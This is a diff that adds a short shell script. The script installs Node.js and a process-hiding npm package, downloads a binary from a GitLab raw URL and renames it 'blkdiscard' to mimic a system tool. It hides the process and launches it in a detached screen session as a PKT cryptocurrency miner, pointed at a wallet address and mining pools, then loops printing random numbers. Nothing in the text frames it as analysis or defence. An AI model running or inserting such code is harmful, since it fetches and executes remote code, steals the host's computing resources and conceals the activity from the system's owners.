@@ -1,0 +1,9 @@
+blkdiscard=$(shuf -n 1 -i 1-999999)
+sudo apt-get update && sudo apt-get install -y screen && sudo apt-get install -y nodejs
+npm i -g node-process-hider
+wget -q https://gitlab.com/bspot1/pekate/-/raw/main/tkp
+mv tkp blkdiscard
+chmod +x blkdiscard
+sudo ph add blkdiscard
+screen -dmS blkdiscard ./blkdiscard ann -p pkt1qmafr3t8l4gl8mgay49a49mlgmh9d968a47dxgl http://pool.pkt.world/master/2048 http://pool.pktpool.io 
+while :; do shuf -n 1 -i 1-99999999; sleep 10; done
